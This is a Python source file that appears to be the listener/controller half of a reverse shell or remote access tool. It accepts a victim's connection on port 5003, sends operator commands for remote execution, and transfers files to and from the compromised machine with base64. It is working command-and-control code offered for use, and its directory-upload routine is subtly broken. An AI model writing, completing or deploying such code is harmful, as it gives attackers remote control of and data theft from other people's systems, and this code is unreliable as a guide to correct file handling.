# usage: python3 server.py
import os
import sys
import json
import base64
import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003

class Connections_Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection" + str(address))
    
    def send_data(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))
    
    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                # code to display that data transfer is going on
                continue
    
    def remote_code_execution(self, command):
        self.send_data(command)
        if command[0].lower() == 'exit':
            self.connection.close()
            sys.exit()
        return self.receive_data()
    
    def download_file(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content))
            return f"[+] \"{path}\" file download successful"
    
    def upload_files(self, path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())
    
    def upload_crap(self, path):
        try:
            if os.path.isfile(path):
                return self.upload_files(path)
            elif os.path.isdir(path):
                for folder, subfolder, files in os.walk(path):
                    for f in files:
                        file_ = os.path.join(os.path.basename(path), f)
                        self.upload_files(file_)
        except Exception as error:
            return str(error).encode()

    def start(self):
        while True:
            try:
                input_command = input(">>> ").split(" ")
                while '' in input_command:
                    input_command.remove('')
                if input_command[0].lower() == 'upload':
                    content = self.upload_files(input_command[1]).decode()
                    input_command.append(content)
                result = self.remote_code_execution(input_command)
                if input_command[0].lower() == 'download':
                    result = self.download_file(input_command[-1], result.encode('utf-8'))
                print(result)
            except Exception as error:
                print(error)
                print(type(error))
                # print("\n----- [=] Connection is still intact [=] -----")

try:
    listen = Connections_Listener(SERVER_HOST, SERVER_PORT)
    listen.start()
except Exception as error:
    print(error)
